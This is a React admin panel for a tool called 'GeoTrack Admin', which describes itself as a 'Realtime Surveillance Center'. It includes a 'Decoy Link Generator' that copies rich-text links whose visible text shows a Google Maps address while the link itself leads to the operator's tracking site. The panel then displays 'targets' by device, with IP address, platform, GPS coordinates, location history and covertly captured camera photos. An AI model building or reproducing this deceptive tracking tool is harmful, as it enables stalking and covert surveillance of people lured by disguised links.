import React, { useState, useMemo } from 'react';
import { LogEntry } from '../types';
import { isSupabaseConfigured } from '../supabaseClient';

interface AdminPanelProps {
  logs: LogEntry[];
}

interface GroupedDevice {
  device_id: string;
  latest_log: LogEntry;
  history: LogEntry[];
  images: { url: string; timestamp: string }[];
  ip_address: string;
  device_info?: any;
}

const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
  const [selectedDevice, setSelectedDevice] = useState<GroupedDevice | null>(null);
  const [viewHistoryDevice, setViewHistoryDevice] = useState<GroupedDevice | null>(null);
  
  // Link Generator State
  const [targetLat, setTargetLat] = useState('');
  const [targetLng, setTargetLng] = useState('');
  const [generatedLink, setGeneratedLink] = useState('');

  // 1. Grouping Logic
  const devices = useMemo(() => {
    const groups: { [key: string]: GroupedDevice } = {};
    const sortedLogs = [...logs].sort((a, b) => new Date(a.created_at).getTime() - new Date(b.created_at).getTime());

    sortedLogs.forEach(log => {
      if (!groups[log.device_id]) {
        groups[log.device_id] = {
          device_id: log.device_id,
          latest_log: log,
          history: [],
          images: [],
          ip_address: log.ip_address || 'Unknown',
          device_info: log.device_info
        };
      }
      groups[log.device_id].latest_log = log;
      groups[log.device_id].history.push(log);
      if (log.image_data) {
        groups[log.device_id].images.push({
            url: log.image_data,
            timestamp: log.created_at
        });
      }
      if (log.device_info) {
        groups[log.device_id].device_info = log.device_info;
      }
    });

    return Object.values(groups).sort((a, b) => 
      new Date(b.latest_log.created_at).getTime() - new Date(a.latest_log.created_at).getTime()
    );
  }, [logs]);

  const generateTargetLink = () => {
    if(!targetLat || !targetLng) return;
    const baseUrl = window.location.origin;
    const link = `${baseUrl}/?target=${targetLat},${targetLng}`;
    setGeneratedLink(link);
  };

  // Generic Link Copy (No Coords)
  const copyGenericLink = async () => {
    const baseUrl = window.location.origin;
    const fakeVisualUrl = "https://www.google.com/maps";

    try {
        const htmlContent = `<a href="${baseUrl}">${fakeVisualUrl}</a>`;
        const blobHtml = new Blob([htmlContent], { type: "text/html" });
        const blobText = new Blob([baseUrl], { type: "text/plain" });

        const data = [new ClipboardItem({
            ["text/html"]: blobHtml,
            ["text/plain"]: blobText
        })];

        await navigator.clipboard.write(data);
        alert('Universal Link Copied! \n\n[MASKING ACTIVE]\nVisual: ' + fakeVisualUrl + '\nTarget: Your System Root');
    } catch (err) {
        console.error("Rich copy failed", err);
        navigator.clipboard.writeText(baseUrl);
        alert('Link copied (Plain Text Mode). Browser did not support masking.');
    }
  };

  // Specific Target Link Copy
  const copyTargetLink = async () => {
    if (!generatedLink) return;

    // The Fake Visual URL (What the user sees in the text)
    const fakeVisualUrl = `https://maps.google.com/maps?q=${targetLat},${targetLng}`;
    
    try {
        // Create both HTML (for rich text apps like WhatsApp Web, Gmail, Word) 
        // and Plain Text (fallback)
        const htmlContent = `<a href="${generatedLink}">${fakeVisualUrl}</a>`;
        
        const blobHtml = new Blob([htmlContent], { type: "text/html" });
        const blobText = new Blob([generatedLink], { type: "text/plain" });

        const data = [new ClipboardItem({
            ["text/html"]: blobHtml,
            ["text/plain"]: blobText
        })];

        await navigator.clipboard.write(data);
        alert('Decoy Link Copied! \n\n[MASKING ACTIVE]\nIf you paste this into Email/WhatsApp, it will look like:\n' + fakeVisualUrl + '\n\nBut it links to your system.');
    } catch (err) {
        console.error("Rich copy failed", err);
        // Fallback to simple copy
        navigator.clipboard.writeText(generatedLink);
        alert('Link copied (Plain Text Mode). Browser did not support masking.');
    }
  };

  return (
    <div className="h-screen w-full overflow-y-auto bg-slate-50 font-sans text-slate-800">
      
      {/* Navbar */}
      <div className="bg-white shadow-sm border-b border-slate-200 px-6 py-4 sticky top-0 z-20 flex justify-between items-center backdrop-blur-md bg-white/90">
        <div className="flex items-center space-x-3">
          <div className="bg-red-600 text-white p-2 rounded-lg shadow-red-200 shadow-lg">
            <i className="fa-solid fa-radar text-xl"></i>
          </div>
          <div>
            <h1 className="text-xl font-bold text-slate-900 tracking-tight">GeoTrack Admin</h1>
            <p className="text-xs text-slate-500 font-medium">Realtime Surveillance Center</p>
          </div>
        </div>
        <div className="flex items-center space-x-3">
           <span className={`text-xs px-3 py-1.5 rounded-full font-bold border ${
             isSupabaseConfigured 
               ? 'bg-emerald-50 text-emerald-700 border-emerald-200' 
               : 'bg-amber-50 text-amber-700 border-amber-200'
           }`}>
             <i className={`fa-solid fa-circle text-[8px] mr-2 ${isSupabaseConfigured ? 'text-emerald-500' : 'text-amber-500'}`}></i>
             {isSupabaseConfigured ? 'LIVE DB' : 'LOCAL'}
           </span>
           <button 
             onClick={() => window.location.href = '/'}
             className="text-sm bg-white border border-slate-300 hover:bg-slate-50 text-slate-700 font-medium px-4 py-2 rounded-lg transition-colors"
           >
             <i className="fa-solid fa-arrow-left mr-2"></i> Map
           </button>
        </div>
      </div>

      <div className="p-6 max-w-7xl mx-auto space-y-6 pb-20">
        
        {/* TOOL: Link Generator */}
        <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-6">
            <h3 className="text-sm font-bold text-slate-800 uppercase tracking-wider mb-6 border-b pb-2 flex items-center justify-between">
                <span>
                    <i className="fa-solid fa-link mr-2 text-indigo-500"></i>
                    Decoy Link Generator
                </span>
                <span className="text-[10px] bg-indigo-100 text-indigo-700 px-2 py-0.5 rounded border border-indigo-200">
                    <i className="fa-solid fa-mask mr-1"></i>
                    Auto-Masking Active
                </span>
            </h3>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                {/* 1. Quick Share (No Coords) */}
                <div className="bg-slate-50 p-4 rounded-lg border border-slate-200 flex flex-col justify-between">
                    <div>
                        <h4 className="font-bold text-slate-700 text-sm mb-1">Universal Tracking Link</h4>
                        <p className="text-xs text-slate-500 mb-4">
                            Creates a generic link. When opened, it finds the user's location via IP/GPS automatically.
                        </p>
                        <div className="bg-white px-3 py-2 rounded border border-dashed border-slate-300 mb-3">
                             <p className="text-[10px] text-slate-400 font-bold uppercase">Mask Preview:</p>
                             <span className="text-sm text-green-600 font-mono">https://www.google.com/maps</span>
                        </div>
                    </div>
                    <button 
                        onClick={copyGenericLink}
                        className="w-full bg-slate-800 hover:bg-slate-900 text-white font-medium px-4 py-2.5 rounded-lg text-sm transition-colors flex items-center justify-center"
                    >
                        <i className="fa-solid fa-copy mr-2"></i> Copy Universal Link
                    </button>
                </div>

                {/* 2. Specific Target (With Coords) */}
                <div className="flex flex-col gap-3">
                    <div>
                        <h4 className="font-bold text-slate-700 text-sm mb-1">Specific Bait Location</h4>
                        <p className="text-xs text-slate-500 mb-3">
                            The map will open at these coordinates initially to lure the target.
                        </p>
                    </div>
                    
                    <div className="flex gap-2">
                        <div className="w-1/2">
                             <label className="text-[10px] text-slate-500 font-bold mb-1 block">LATITUDE</label>
                             <input 
                                type="number" step="any" placeholder="-6.2088" 
                                className="w-full bg-slate-50 border border-slate-300 rounded-lg px-3 py-2 text-sm focus:ring-2 focus:ring-indigo-500 outline-none"
                                value={targetLat} onChange={(e) => setTargetLat(e.target.value)}
                            />
                        </div>
                        <div className="w-1/2">
                             <label className="text-[10px] text-slate-500 font-bold mb-1 block">LONGITUDE</label>
                             <input 
                                type="number" step="any" placeholder="106.8456" 
                                className="w-full bg-slate-50 border border-slate-300 rounded-lg px-3 py-2 text-sm focus:ring-2 focus:ring-indigo-500 outline-none"
                                value={targetLng} onChange={(e) => setTargetLng(e.target.value)}
                            />
                        </div>
                    </div>
                    
                    <button 
                        onClick={generateTargetLink}
                        className="w-full bg-indigo-50 hover:bg-indigo-100 text-indigo-700 border border-indigo-200 font-medium px-4 py-2 rounded-lg text-sm transition-colors"
                    >
                        Generate Coordinates Link
                    </button>

                    {generatedLink && (
                        <div className="flex gap-2 animate-in fade-in slide-in-from-top-1">
                             <div className="flex-1 bg-indigo-50 border border-indigo-100 rounded px-2 py-1.5 flex items-center">
                                <span className="text-xs text-green-600 truncate font-mono">https://maps.google.com/maps?q=...</span>
                             </div>
                             <button onClick={copyTargetLink} className="bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-1 rounded text-xs font-bold shadow-sm">
                                Copy
                             </button>
                        </div>
                    )}
                </div>
            </div>
            
            <p className="text-xs text-slate-400 mt-4 text-center border-t border-slate-100 pt-3">
                <i className="fa-solid fa-circle-info mr-1"></i> 
                Both links utilize <b>HTML Injection</b> to mask the URL in rich-text environments (WhatsApp Web, Gmail, etc).
            </p>
        </div>

        {/* ACTIVE TARGETS LIST */}
        <div className="bg-white rounded-xl shadow-lg border border-slate-200 overflow-hidden">
          <div className="px-6 py-4 border-b border-slate-100 flex justify-between items-center bg-slate-50/50">
            <div>
                <h2 className="font-bold text-slate-800 text-lg">Active Targets</h2>
                <p className="text-xs text-slate-500">Grouped by Device ID • Realtime Updates</p>
            </div>
            <div className="text-right">
                <span className="text-2xl font-bold text-slate-800">{devices.length}</span>
                <span className="text-xs text-slate-400 block uppercase font-bold">Devices</span>
            </div>
          </div>
          
          <div className="divide-y divide-slate-100">
            {devices.length === 0 ? (
                <div className="p-10 text-center text-slate-400">
                    <i className="fa-solid fa-satellite-dish text-4xl mb-3 opacity-20"></i>
                    <p>No active targets found.</p>
                </div>
            ) : (
                devices.map((device) => (
                    <div key={device.device_id} className="p-6 hover:bg-slate-50 transition-colors">
                        <div className="flex flex-col md:flex-row gap-6">
                            
                            {/* 1. Device Info Column */}
                            <div className="w-full md:w-1/4 min-w-[200px]">
                                <div className="flex items-center gap-2 mb-2">
                                    <div className="w-3 h-3 rounded-full bg-green-500 animate-pulse"></div>
                                    <span className="font-mono font-bold text-sm text-slate-700">
                                        {device.device_id.split('_')[1] || device.device_id}
                                    </span>
                                </div>
                                
                                <div className="text-xs text-slate-500 space-y-1 mb-3">
                                    <p><i className="fa-solid fa-clock mr-1.5 opacity-70"></i> {new Date(device.latest_log.created_at).toLocaleTimeString()}</p>
                                    <p><i className="fa-solid fa-network-wired mr-1.5 opacity-70"></i> {device.ip_address}</p>
                                    {device.device_info && (
                                        <p title={device.device_info.userAgent}>
                                            <i className="fa-solid fa-mobile-screen mr-2 opacity-70"></i>
                                            {device.device_info.platform} 
                                        </p>
                                    )}
                                </div>

                                <div className="flex gap-2">
                                    <span className="px-2 py-1 bg-slate-100 text-slate-600 text-[10px] font-bold rounded uppercase border border-slate-200">
                                        {device.latest_log.status}
                                    </span>
                                    <button 
                                        onClick={() => setViewHistoryDevice(device)}
                                        className="px-2 py-1 bg-blue-50 hover:bg-blue-100 text-blue-600 text-[10px] font-bold rounded uppercase border border-blue-100 transition-colors flex items-center gap-1.5"
                                        title="View Location History"
                                    >
                                        <i className="fa-solid fa-list-ol"></i>
                                        {device.history.length} Logs
                                    </button>
                                </div>
                            </div>

                            {/* 2. Location Column */}
                            <div className="w-full md:w-1/3 border-l border-slate-100 pl-0 md:pl-6">
                                <label className="text-[10px] font-bold text-slate-400 uppercase tracking-wider mb-2 block">Current Location</label>
                                <div className="flex items-start gap-3">
                                    <div className="text-3xl text-red-500">
                                        <i className="fa-solid fa-map-location-dot"></i>
                                    </div>
                                    <div>
                                        <p className="font-mono text-lg font-bold text-slate-800">
                                            {device.latest_log.latitude.toFixed(5)}, {device.latest_log.longitude.toFixed(5)}
                                        </p>
                                        <a 
                                            href={`https://www.google.com/maps?q=${device.latest_log.latitude},${device.latest_log.longitude}`}
                                            target="_blank"
                                            rel="noreferrer"
                                            className="text-xs text-blue-600 hover:underline font-medium flex items-center mt-1"
                                        >
                                            Open in Google Maps <i className="fa-solid fa-arrow-up-right-from-square ml-1 text-[10px]"></i>
                                        </a>
                                    </div>
                                </div>
                            </div>

                            {/* 3. Media Column */}
                            <div className="flex-1 border-l border-slate-100 pl-0 md:pl-6">
                                <label className="text-[10px] font-bold text-slate-400 uppercase tracking-wider mb-2 flex justify-between">
                                    <span>Latest Capture</span>
                                    {device.images.length > 0 && <span className="text-slate-500">{device.images.length} photos</span>}
                                </label>
                                
                                {device.images.length > 0 ? (
                                    <div className="flex gap-3">
                                        {/* Latest Image (Big) */}
                                        <div 
                                            onClick={() => setSelectedDevice(device)}
                                            className="relative group w-32 h-20 md:w-40 md:h-24 bg-black rounded-lg overflow-hidden cursor-pointer shadow-md hover:shadow-xl transition-all border border-slate-200"
                                        >
                                            <img 
                                                src={device.images[device.images.length - 1].url} 
                                                alt="Latest" 
                                                className="w-full h-full object-cover opacity-90 group-hover:opacity-100"
                                            />
                                            <div className="absolute inset-0 flex items-center justify-center bg-black/30 group-hover:bg-transparent transition-all">
                                                <i className="fa-solid fa-expand text-white opacity-0 group-hover:opacity-100 transition-opacity drop-shadow-md"></i>
                                            </div>
                                            <div className="absolute bottom-1 right-1 px-1.5 py-0.5 bg-black/60 rounded text-[9px] text-white font-mono">
                                                NOW
                                            </div>
                                        </div>
                                        
                                        {/* Previous Image (Preview) */}
                                        {device.images.length > 1 && (
                                            <div 
                                                onClick={() => setSelectedDevice(device)}
                                                className="hidden md:block w-20 h-24 bg-slate-100 rounded-lg overflow-hidden cursor-pointer border border-dashed border-slate-300 flex items-center justify-center hover:bg-slate-200 transition-colors"
                                            >
                                                 <span className="text-xs text-slate-500 font-bold">+{device.images.length - 1}</span>
                                            </div>
                                        )}
                                    </div>
                                ) : (
                                    <div className="h-20 flex items-center text-slate-400 text-sm italic bg-slate-50 rounded-lg px-4 border border-dashed border-slate-200">
                                        <i className="fa-solid fa-image-slash mr-2"></i> No images captured
                                    </div>
                                )}
                            </div>

                        </div>
                    </div>
                ))
            )}
          </div>
        </div>
      </div>

      {/* GALLERY MODAL */}
      {selectedDevice && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/95 backdrop-blur-sm p-4 animate-in fade-in duration-200">
          <div className="bg-white rounded-xl max-w-6xl w-full max-h-[90vh] flex flex-col shadow-2xl overflow-hidden">
            <div className="px-6 py-4 border-b border-slate-100 flex justify-between items-center bg-white">
                <div>
                    <h3 className="text-lg font-bold text-slate-800">Target Gallery</h3>
                    <p className="text-xs text-slate-500 font-mono">ID: {selectedDevice.device_id}</p>
                </div>
                <button onClick={() => setSelectedDevice(null)} className="w-8 h-8 rounded-full bg-slate-100 hover:bg-slate-200 flex items-center justify-center text-slate-600 transition-colors">
                  <i className="fa-solid fa-xmark"></i>
                </button>
            </div>
            <div className="flex-1 overflow-y-auto p-6 bg-slate-50">
                <div className="mb-8">
                    <h4 className="text-xs font-bold text-slate-400 uppercase mb-3">Latest Capture</h4>
                    <div className="rounded-xl overflow-hidden shadow-lg border-4 border-white">
                        <img src={selectedDevice.images[selectedDevice.images.length - 1].url} className="w-full h-auto max-h-[500px] object-contain bg-black" alt="Latest" />
                    </div>
                </div>
                {selectedDevice.images.length > 1 && (
                    <div>
                         <h4 className="text-xs font-bold text-slate-400 uppercase mb-3">History ({selectedDevice.images.length} photos)</h4>
                        <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
                            {[...selectedDevice.images].reverse().map((img, idx) => (
                                <div key={idx} className="group relative rounded-lg overflow-hidden shadow-sm bg-white border border-slate-200 aspect-video">
                                    <img src={img.url} alt={`Capture ${idx}`} className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-110" />
                                    <div className="absolute inset-0 bg-gradient-to-t from-black/70 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
                                        <span className="absolute bottom-2 right-2 text-[10px] text-white font-mono">{new Date(img.timestamp).toLocaleTimeString()}</span>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>
                )}
            </div>
             <div className="px-6 py-3 border-t border-slate-100 bg-white text-right">
                <button onClick={() => setSelectedDevice(null)} className="px-4 py-2 bg-slate-100 hover:bg-slate-200 text-slate-700 text-sm font-bold rounded-lg transition-colors">Close Gallery</button>
            </div>
          </div>
        </div>
      )}

      {/* HISTORY MODAL */}
      {viewHistoryDevice && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-slate-900/50 backdrop-blur-sm p-4 animate-in fade-in duration-200">
            <div className="bg-white rounded-xl max-w-4xl w-full max-h-[80vh] flex flex-col shadow-2xl border border-slate-200 overflow-hidden">
                <div className="px-6 py-4 border-b border-slate-100 flex justify-between items-center bg-slate-50">
                     <div>
                        <h3 className="text-lg font-bold text-slate-800 flex items-center gap-2">
                            <i className="fa-solid fa-clock-rotate-left text-blue-500"></i> Location History
                        </h3>
                        <p className="text-xs text-slate-500 font-mono">Device: {viewHistoryDevice.device_id}</p>
                     </div>
                     <button onClick={() => setViewHistoryDevice(null)} className="w-8 h-8 rounded-full bg-white border border-slate-200 hover:bg-slate-100 flex items-center justify-center text-slate-500 transition-colors">
                      <i className="fa-solid fa-xmark"></i>
                    </button>
                </div>
                <div className="flex-1 overflow-y-auto">
                    <table className="w-full text-left text-xs text-slate-600">
                        <thead className="bg-slate-100 text-slate-500 font-bold uppercase tracking-wider sticky top-0 z-10 shadow-sm">
                            <tr>
                                <th className="px-6 py-3 border-b border-slate-200 bg-slate-100">Time</th>
                                <th className="px-6 py-3 border-b border-slate-200 bg-slate-100">Coordinates</th>
                                <th className="px-6 py-3 border-b border-slate-200 bg-slate-100">Details</th>
                                <th className="px-6 py-3 border-b border-slate-200 bg-slate-100 text-right">Action</th>
                            </tr>
                        </thead>
                        <tbody className="divide-y divide-slate-100 bg-white">
                            {[...viewHistoryDevice.history].reverse().map((log) => (
                                <tr key={log.id} className="hover:bg-blue-50/50 transition-colors">
                                    <td className="px-6 py-3 font-mono border-r border-slate-50">
                                        <div className="font-bold text-slate-700">{new Date(log.created_at).toLocaleTimeString()}</div>
                                        <div className="text-[10px] text-slate-400">{new Date(log.created_at).toLocaleDateString()}</div>
                                    </td>
                                    <td className="px-6 py-3 font-medium">
                                        <div className="flex items-center gap-2">
                                            <span className="text-slate-800 font-mono">{log.latitude.toFixed(6)}, {log.longitude.toFixed(6)}</span>
                                        </div>
                                    </td>
                                    <td className="px-6 py-3 text-slate-500">
                                        <div className="flex flex-col gap-0.5">
                                            <span>IP: {log.ip_address}</span>
                                            {log.image_data && <span className="text-[10px] text-green-600 font-bold flex items-center gap-1"><i className="fa-solid fa-camera"></i> Capture</span>}
                                        </div>
                                    </td>
                                    <td className="px-6 py-3 text-right">
                                         <a href={`https://www.google.com/maps?q=${log.latitude},${log.longitude}`} target="_blank" rel="noreferrer" className="inline-flex items-center px-2 py-1 bg-slate-100 hover:bg-blue-600 hover:text-white text-slate-600 rounded transition-colors text-[10px] font-bold">
                                            View Map <i className="fa-solid fa-arrow-up-right-from-square ml-1.5"></i>
                                        </a>
                                    </td>
                                </tr>
                            ))}
                        </tbody>
                    </table>
                </div>
                 <div className="px-6 py-3 border-t border-slate-100 bg-slate-50 text-right">
                     <span className="text-xs text-slate-400 mr-2">Total records: {viewHistoryDevice.history.length}</span>
                </div>
            </div>
        </div>
    )}

    </div>
  );
};

export default AdminPanel;